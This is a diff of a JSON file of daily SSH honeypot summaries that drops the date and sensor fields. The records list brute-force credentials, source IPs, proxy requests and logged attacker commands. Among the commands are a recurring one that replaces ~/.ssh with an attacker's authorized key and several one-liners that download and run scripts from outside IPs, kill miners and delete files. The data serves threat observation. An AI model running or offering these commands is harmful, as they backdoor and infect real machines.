       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 686,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 686
     },
     {
       "input": "w",
-      "count": 2,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 2
     },
     {
       "input": "echo Hi | cat -n",
-      "count": 2,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 2
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.178",
       "dst_port": 2222,
-      "count": 592,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 592
     },
     {
       "src_ip": "49.88.112.114",
       "dst_port": 2222,
-      "count": 531,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 531
     },
     {
       "src_ip": "5.188.86.169",
       "dst_port": 2222,
-      "count": 323,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 323
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.178",
       "robot": true,
-      "count": 408,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 408
     },
     {
       "src_ip": "49.88.112.114",
       "robot": false,
-      "count": 280,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 280
     },
     {
       "src_ip": "5.188.87.60",
       "robot": true,
-      "count": 269,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 269
     }
   ],
   "file_upload": [
     {
       "filename": "eyshcjdmzg",
       "src_ip": "154.223.167.114",
-      "count": 1,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -2382,25 +1794,19 @@
       "src_ip": "5.188.87.51",
       "dst_ip": "IV0001-NPXS01001-00.auth.np.ac.playstation.net",
       "dst_port": 443,
-      "count": 968,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 968
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "www.google.ru",
       "dst_port": 443,
-      "count": 423,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 423
     },
     {
       "src_ip": "5.188.86.178",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 408,
-      "date": "2021-03-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 408
     }
   ]
 },
@@ -2411,109 +1817,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 1156,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1156
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 413,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 413
     },
     {
       "username": "root",
       "password": "root",
-      "count": 8,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 8
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 477,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 477
     },
     {
       "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-      "count": 440,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 440
     },
     {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 440,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 440
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 439,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 439
     },
     {
       "input": "uname -a",
-      "count": 38,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 38
     },
     {
       "input": "pkill kitten; pkill YDEdr; pkill ip; pkill xmrig; pkill cnrig; pkill kswapd0; pkill x86_64; pkill x86; cd /tmp; rm -rf config.json; rm -rf kitten; wget http://88.218.17.142/boom.sh; curl -O http://88.218.17.142/boom.sh; busybox wget http://88.218.17.142/boom.sh; chmod 777 *; sh boom.sh; cat /etc/issue;",
-      "count": 13,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 13
     }
   ],
   "connect": [
     {
       "src_ip": "146.185.180.57",
       "dst_port": 2222,
-      "count": 130,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 130
     },
     {
       "src_ip": "206.189.18.40",
       "dst_port": 2222,
-      "count": 127,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 127
     },
     {
       "src_ip": "120.53.124.220",
       "dst_port": 2222,
-      "count": 123,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 123
     }
   ],
   "session_closed": [
     {
       "src_ip": "146.185.180.57",
       "robot": true,
-      "count": 130,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 130
     },
     {
       "src_ip": "206.189.18.40",
       "robot": true,
-      "count": 127,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 127
     },
     {
       "src_ip": "5.188.86.212",
       "robot": true,
-      "count": 105,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 105
     }
   ],
   "file_download": [
@@ -2524,9 +1900,7 @@
         "positives": 11,
         "total": 53
       },
-      "count": 1,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": "http://71.127.148.69/.x/1sh",
@@ -2535,9 +1909,7 @@
         "positives": 11,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -2545,25 +1917,19 @@
       "src_ip": "5.188.86.212",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 106,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 106
     },
     {
       "src_ip": "5.188.86.169",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 89,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 89
     },
     {
       "src_ip": "5.188.86.207",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 80,
-      "date": "2021-05-02",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 80
     }
   ]
 },
@@ -2574,109 +1940,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 19404,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 19404
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 483,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 483
     },
     {
       "username": "root",
       "password": "dietpi",
-      "count": 53,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 53
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 500,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 500
     },
     {
       "input": "crontab -l",
-      "count": 500,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 500
     },
     {
       "input": "which ls",
-      "count": 500,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 500
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 496,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 496
     },
     {
       "input": "echo -e \"\\x6F\\x6B\"",
-      "count": 125,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 125
     },
     {
       "input": "cat /etc/issue; cd /tmp; rm -rf x86_64; wget http://45.14.149.244/x86_64; chmod 777 x86_64; ./x86_64 x86hxed; echo firewalla1337 & Anarchy were here",
-      "count": 14,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 14
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.87.57",
       "dst_port": 2222,
-      "count": 1538,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1538
     },
     {
       "src_ip": "5.188.87.49",
       "dst_port": 2222,
-      "count": 1111,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1111
     },
     {
       "src_ip": "5.188.86.206",
       "dst_port": 2222,
-      "count": 1062,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1062
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.87.57",
       "robot": true,
-      "count": 1124,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1124
     },
     {
       "src_ip": "5.188.87.49",
       "robot": true,
-      "count": 1097,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1097
     },
     {
       "src_ip": "5.188.86.169",
       "robot": true,
-      "count": 867,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 867
     }
   ],
   "file_download": [
@@ -2687,9 +2023,7 @@
         "positives": 24,
         "total": 59
       },
-      "count": 1,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -2697,25 +2031,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "184.150.200.206",
       "dst_port": 443,
-      "count": 1900,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1900
     },
     {
       "src_ip": "5.188.87.57",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 1131,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1131
     },
     {
       "src_ip": "5.188.87.49",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 1097,
-      "date": "2021-06-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1097
     }
   ]
 },
@@ -2726,109 +2054,79 @@
     {
       "username": "root",
       "password": "admin",
-      "count": 13898,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 13898
     },
     {
       "username": "root",
       "password": "123",
-      "count": 1586,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1586
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 929,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 929
     }
   ],
   "commands": [
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 949,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 949
     },
     {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 944,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 944
     },
     {
       "input": "uname -a",
-      "count": 943,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 943
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 940,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 940
     },
     {
       "input": "uname -n -s -r -v;cat /etc/issue",
-      "count": 13,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 13
     },
     {
       "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.75.191.234/sh; curl -O http://51.75.191.234/sh; chmod 777 sh; sh sh; tftp 51.75.191.234 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 51.75.191.234; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 51.75.191.234 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *",
-      "count": 11,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 11
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.167",
       "dst_port": 2222,
-      "count": 927,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 927
     },
     {
       "src_ip": "5.188.87.60",
       "dst_port": 2222,
-      "count": 926,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 926
     },
     {
       "src_ip": "45.227.255.163",
       "dst_port": 2222,
-      "count": 857,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 857
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.87.60",
       "robot": true,
-      "count": 746,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 746
     },
     {
       "src_ip": "5.188.86.167",
       "robot": true,
-      "count": 689,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 689
     },
     {
       "src_ip": "5.188.86.221",
       "robot": true,
-      "count": 667,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 667
     }
   ],
   "file_download": [
@@ -2839,9 +2137,7 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1
     },
     {
       "url": "http://71.127.148.69/.x/1sh",
@@ -2850,9 +2146,7 @@
         "positives": 7,
         "total": 59
       },
-      "count": 1,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -2860,25 +2154,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "24.201.245.33",
       "dst_port": 993,
-      "count": 1716,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1716
     },
     {
       "src_ip": "5.182.39.62",
       "dst_ip": "i.instagram.com",
       "dst_port": 443,
-      "count": 1539,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1539
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "64.59.128.135",
       "dst_port": 993,
-      "count": 1428,
-      "date": "2021-03-17",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1428
     }
   ]
 },
@@ -2889,109 +2177,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18914,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18914
     },
     {
       "username": "root",
       "password": "test",
-      "count": 272,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 272
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 124,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 124
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 139,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 139
     },
     {
       "input": "uname",
-      "count": 129,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 129
     },
     {
       "input": "top",
-      "count": 129,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 129
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 125,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 125
     },
     {
       "input": "cat /etc/issue",
-      "count": 16,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 16
     },
     {
       "input": "uname -a",
-      "count": 11,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 11
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.87.49",
       "dst_port": 2222,
-      "count": 1247,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1247
     },
     {
       "src_ip": "5.188.87.60",
       "dst_port": 2222,
-      "count": 1217,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1217
     },
     {
       "src_ip": "5.188.86.216",
       "dst_port": 2222,
-      "count": 1191,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1191
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.216",
       "robot": true,
-      "count": 898,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 898
     },
     {
       "src_ip": "5.188.87.49",
       "robot": true,
-      "count": 871,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 871
     },
     {
       "src_ip": "5.188.87.60",
       "robot": true,
-      "count": 866,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 866
     }
   ],
   "file_download": [
@@ -3002,9 +2260,7 @@
         "positives": 0,
         "total": 56
       },
-      "count": 1,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -3013,9 +2269,7 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -3024,32 +2278,24 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
       "src_ip": "218.17.185.162",
-      "count": 1,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota3.tar.gz",
       "src_ip": "175.126.73.16",
-      "count": 1,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "58.221.101.182",
-      "count": 1,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -3057,25 +2303,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "check2.zennolab.com",
       "dst_port": 80,
-      "count": 1217,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1217
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "chek.zennolab.com",
       "dst_port": 80,
-      "count": 970,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 970
     },
     {
       "src_ip": "78.128.113.150",
       "dst_ip": "omegle.com",
       "dst_port": 80,
-      "count": 953,
-      "date": "2021-05-06",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 953
     }
   ]
 },
@@ -3086,109 +2326,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18322,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18322
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 716,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 716
     },
     {
       "username": "root",
       "password": "dietpi",
-      "count": 54,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 54
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 802,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 802
     },
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 738,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 738
     },
     {
       "input": "lscpu | grep Model",
-      "count": 727,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 727
     }
   ],
   "pre_disconnect_command": [
     {
